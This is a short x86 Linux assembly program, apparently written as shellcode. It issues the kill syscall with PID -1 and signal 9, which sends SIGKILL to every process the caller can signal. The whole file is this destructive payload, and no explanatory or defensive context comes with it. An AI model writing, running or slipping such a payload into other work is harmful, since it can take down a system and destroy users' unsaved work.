global _start

section .text

_start:

	mov al, 37 ; Load syscall straight into al
	mov ebx, 0 ; Set EBX to 0
	sub ebx, 1 ; Make EBX -1
	mov ecx, 9 
	int 0x80
